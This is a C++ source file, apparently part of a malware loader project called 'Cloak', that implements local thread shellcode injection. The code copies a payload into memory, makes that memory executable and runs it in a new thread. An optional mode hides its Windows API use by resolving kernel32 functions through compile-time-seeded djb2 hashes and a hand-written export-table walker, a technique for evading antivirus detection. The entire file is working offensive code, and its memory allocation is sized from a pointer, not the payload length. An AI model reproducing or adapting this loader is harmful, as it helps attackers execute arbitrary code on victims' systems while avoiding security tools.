#include "Cloak.hpp"

#ifdef LOCAL_THREAD

#ifdef HASH_API

#define SEED 6

constexpr int RandomCompileTimeSeed(void)
{
	return '0' * -23784 +
		__TIME__[7] * 345 +
		__TIME__[6] * 12 +
		__TIME__[4] * 2345123 +
		__TIME__[3] * 623 +
		__TIME__[1] * 95897 +
		__TIME__[0] * 2;
};

constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;

constexpr DWORD HashStringDjb2A(const char* String) {
	ULONG Hash = (ULONG)g_KEY;
	INT c = 0;
	while ((c = *String++)) {
		Hash = ((Hash << SEED) + Hash) + c;
	}

	return Hash;
}

#define RTIME_HASHA( API ) HashStringDjb2A((const char*) API)
#define CTIME_HASHA( API ) constexpr auto API##_Rotr32A = HashStringDjb2A((const char*) #API);

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {

	PBYTE pBase = (PBYTE)hModule;

	PIMAGE_DOS_HEADER			pImgDosHdr				= (PIMAGE_DOS_HEADER)pBase;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	PIMAGE_NT_HEADERS			pImgNtHdrs				= (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	IMAGE_OPTIONAL_HEADER		ImgOptHdr				= pImgNtHdrs->OptionalHeader;

	PIMAGE_EXPORT_DIRECTORY		pImgExportDir			= (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PDWORD						FunctionNameArray		= (PDWORD)(pBase + pImgExportDir->AddressOfNames);
	PDWORD						FunctionAddressArray	= (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
	PWORD						FunctionOrdinalArray	= (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
		CHAR*	pFunctionName		= (CHAR*)(pBase + FunctionNameArray[i]);
		PVOID	pFunctionAddress	= (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

		if (dwApiNameHash == RTIME_HASHA(pFunctionName)) { // runtime hash value check 
			return (FARPROC)pFunctionAddress;
		}
	}

	return NULL;
}

typedef LPVOID ( WINAPI * fnVirtualAlloc ) (
    LPVOID  lpAddress,
    SIZE_T  dwSize,
    DWORD   flAllocationType,
    DWORD   flProtect
);

typedef BOOL ( WINAPI * fnVirtualProtect ) (
    LPVOID  lpAddress,
    SIZE_T  dwSize,
    DWORD   flNewProtect,
    PDWORD  lpflOldProtect
);

typedef HANDLE ( WINAPI * fnCreateThread ) (
    LPSECURITY_ATTRIBUTES   lpThreadAttribute,
    SIZE_T                  dwStackSize,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    LPVOID                  lpParameter,
    DWORD                   dwCreationFlags,
    LPDWORD                 lpThreadId
);

typedef DWORD ( WINAPI * fnWaitForSingleObject ) (
    HANDLE  hHandle,
    DWORD   dwMilliseconds
);

typedef BOOL ( WINAPI * fnHeapFree ) (
    HANDLE  hHeap,
    DWORD   dwFlags,
    LPVOID  lpMem
);

typedef HANDLE ( WINAPI * fnGetProcessHeap ) ();

CTIME_HASHA(VirtualAlloc)
CTIME_HASHA(VirtualProtect)
CTIME_HASHA(CreateThread)
CTIME_HASHA(WaitForSingleObject)
CTIME_HASHA(HeapFree)
CTIME_HASHA(GetProcessHeap)

BOOL LocalThreadInject(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    HMODULE hKernel32 = NULL;

    if ( ( hKernel32 = LoadLibraryA( "KERNEL32.DLL" ) ) == NULL ) {
        #ifdef DEBUG
        printf( "[-] LoadLibraryA Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    #ifdef DEBUG
    // print hash values
    printf( "[i] VirtualAlloc : 0x%0.8X\n", VirtualAlloc_Rotr32A );
    printf( "[i] VirtualProtect : 0x%0.8X\n", VirtualProtect_Rotr32A );
    printf( "[i] CreateThread : 0x%0.8X\n", CreateThread_Rotr32A );
    printf( "[i] WaitForSingleObject : 0x%0.8X\n", WaitForSingleObject_Rotr32A );
    printf( "[i] HeapFree : 0x%0.8X\n", HeapFree_Rotr32A );
    printf( "[i] GetProcessHeap : 0x%0.8X\n", GetProcessHeap_Rotr32A );
    #endif

    fnVirtualAlloc pVirtualAlloc = ( fnVirtualAlloc ) GetProcAddressH( hKernel32, VirtualAlloc_Rotr32A );
    if ( pVirtualAlloc == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualAlloc\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnVirtualProtect pVirtualProtect = ( fnVirtualProtect ) GetProcAddressH( hKernel32, VirtualProtect_Rotr32A );
    if ( pVirtualProtect == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for VirtualProtect\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnCreateThread pCreateThread = ( fnCreateThread ) GetProcAddressH( hKernel32, CreateThread_Rotr32A );
    if ( pCreateThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for CreateThread\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnWaitForSingleObject pWaitForSingleObject = ( fnWaitForSingleObject ) GetProcAddressH( hKernel32, WaitForSingleObject_Rotr32A );
    if ( pWaitForSingleObject == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for WaitForSingleObject\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnHeapFree pHeapFree = ( fnHeapFree ) GetProcAddressH( hKernel32, HeapFree_Rotr32A );
    if ( pHeapFree == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for HeapFree\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    fnGetProcessHeap pGetProcessHeap = ( fnGetProcessHeap ) GetProcAddressH( hKernel32, GetProcessHeap_Rotr32A );
    if ( pGetProcessHeap == NULL ) {
        #ifdef DEBUG
        printf( "[-] Unable to get address for GetProcessHeap\n" );
        #endif // !DEBUG
        
        return FALSE;
    }

    

    // ---

    DWORD   dwOldProtect        = NULL;
    PVOID   pPayloadAddress     = NULL;
    HANDLE  hThread             = NULL;

    pPayloadAddress = pVirtualAlloc( NULL, sizeof( pbPayload ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] pVirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    memcpy( pPayloadAddress, pbPayload, sPayloadSize );
    memset( pbPayload, '\0', sPayloadSize );

    if ( ! pVirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] pVirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG

        return FALSE;
    }
    
    hThread = pCreateThread( NULL, NULL, ( LPTHREAD_START_ROUTINE ) pPayloadAddress, NULL, NULL, NULL );
    if ( hThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] pCreateThread Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }
    pWaitForSingleObject( hThread, WAIT_TIME );

    pHeapFree( pGetProcessHeap(), 0, pbPayload );

    return TRUE;
}

#else

BOOL LocalThreadInject(IN PBYTE pbPayload[], IN SIZE_T sPayloadSize) {
    DWORD   dwOldProtect        = NULL;
    PVOID   pPayloadAddress     = NULL;
    HANDLE  hThread             = NULL;

    pPayloadAddress = VirtualAlloc( NULL, sizeof( pbPayload ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( pPayloadAddress == NULL ) {
        #ifdef DEBUG
        printf( "[-] VirtualAlloc Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }

    memcpy( pPayloadAddress, pbPayload, sPayloadSize );
    memset( pbPayload, '\0', sPayloadSize );

    if ( ! VirtualProtect( pPayloadAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtect ) ) {
        #ifdef DEBUG
        printf( "[-] VirtualProtect Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG

        return FALSE;
    }

    hThread = CreateThread( NULL, NULL, ( LPTHREAD_START_ROUTINE ) pPayloadAddress, NULL, NULL, NULL );
    if ( hThread == NULL ) {
        #ifdef DEBUG
        printf( "[-] CreateThread Failed with Error -> %d\n", GetLastError() );
        #endif // !DEBUG
        
        return FALSE;
    }
    WaitForSingleObject( hThread, WAIT_TIME );

    HeapFree( GetProcessHeap(), 0, pbPayload );

    return TRUE;
}

#endif // !HASH_API

#endif // !LOCAL_THREAD